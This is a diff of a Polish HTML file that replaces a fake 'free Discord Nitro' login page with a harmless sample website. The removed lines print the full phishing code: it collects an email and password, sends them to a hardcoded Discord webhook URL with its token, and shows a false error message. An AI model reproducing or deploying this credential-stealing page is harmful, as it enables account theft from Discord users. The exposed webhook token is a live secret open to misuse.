@@ -3,98 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
+    <title>Moja Przykładowa Strona</title>
     <style>
+        /* CSS - Wygląd strony */
+        :root {
+            --primary-color: #2c3e50;
+            --accent-color: #3498db;
+            --text-light: #ecf0f1;
+        }
+
         body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             margin: 0;
-            padding: 0;
-            background: #36393f;
-            font-family: 'Segoe UI', Arial, sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #dcddde;
+            line-height: 1.6;
+            color: #333;
+            background-color: #f4f4f4;
         }
+
+        header {
+            background: var(--primary-color);
+            color: var(--text-light);
+            padding: 2rem 1rem;
+            text-align: center;
+        }
+
+        nav {
+            background: #34495e;
+            padding: 0.5rem;
+            text-align: center;
+            position: sticky;
+            top: 0;
+        }
+
+        nav a {
+            color: white;
+            text-decoration: none;
+            padding: 0 15px;
+            font-weight: bold;
+        }
+
+        nav a:hover {
+            color: var(--accent-color);
+        }
+
         .container {
-            background: #202225;
-            padding: 30px;
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
             border-radius: 8px;
-            width: 380px;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
         }
-        h1 {
-            text-align: center;
-            color: #fff;
-            margin-bottom: 8px;
-        }
-        p {
-            text-align: center;
-            color: #b9bbbe;
-            margin-bottom: 25px;
-        }
-        input {
-            width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            background: #2f3136;
-            border: none;
-            border-radius: 4px;
-            color: #dcddde;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            background: #5865f2;
+
+        .btn-click {
+            background: var(--accent-color);
             color: white;
             border: none;
-            border-radius: 4px;
-            font-size: 16px;
-            font-weight: bold;
+            padding: 10px 20px;
             cursor: pointer;
-            margin-top: 10px;
+            border-radius: 5px;
+            font-size: 1rem;
+            transition: background 0.3s;
         }
-        button:hover {
-            background: #4752c4;
+
+        .btn-click:hover {
+            background: #2980b9;
         }
-        .small {
+
+        footer {
             text-align: center;
-            font-size: 12px;
-            margin-top: 20px;
-            color: #72767d;
+            padding: 20px;
+            font-size: 0.9rem;
+            color: #777;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Odbierz Nitro za darmo!</h1>
-        <p>Zaloguj się, żeby odebrać 3-miesięczny Discord Nitro</p>
-        <input type="text" placeholder="Nazwa użytkownika lub email" id="email">
-        <input type="password" placeholder="Hasło" id="password">
+
+    <header>
+        <h1>Witaj na mojej stronie!</h1>
+        <p>To jest przykładowy szablon stworzony w HTML i CSS.</p>
+    </header>
+
+    <nav>
+        <a href="#o-mnie">O mnie</a>
+        <a href="#uslugi">Usługi</a>
+        <a href="#kontakt">Kontakt</a>
+    </nav>
+
+    <div class="container" id="o-mnie">
+        <h2>O projekcie</h2>
+        <p>Stworzenie strony internetowej to połączenie trzech elementów:</p>
+        <ul>
+            <li><strong>HTML:</strong> Szkielet strony.</li>
+            <li><strong>CSS:</strong> Styl i estetyka.</li>
+            <li><strong>JavaScript:</strong> Interakcja z użytkownikiem.</li>
+        </ul>
         
-        <button onclick="login()">Zaloguj się</button>
-        
-        <div class="small">Zapomniałeś hasła?</div>
+        <button class="btn-click" onclick="powitanie()">Kliknij mnie!</button>
+        <p id="wiadomosc" style="margin-top: 15px; font-weight: bold; color: var(--accent-color);"></p>
     </div>
 
+    <footer>
+        &copy; 2026 Projekt Gemini. Stworzono z pasją.
+    </footer>
+
     <script>
-        function login() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            
-            if (email && password) {
-                fetch('https://discord.com/api/webhooks/1501014502097813509/SwPATh2xn8-gi5aPGp3LRymj8LxWoF_bOWZx5hjfMPHwx-KhgY2v9OKbN80Mjy1x_8hd', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        content: `**Nitro Grabber - Nowa ofiara!**\n\n**Email:** ${email}\n**Hasło:** ${password}`
-                    })
-                }).catch(() => {});
-                
-                alert("Coś poszło nie tak. Spróbuj ponownie.");
-            }
+        // JavaScript - Interakcja
+        function powitanie() {
+            const msg = document.getElementById('wiadomosc');
+            msg.innerText = "Dziękuję za kliknięcie! JavaScript działa poprawnie.";
         }
     </script>
+
 </body>
 </html>
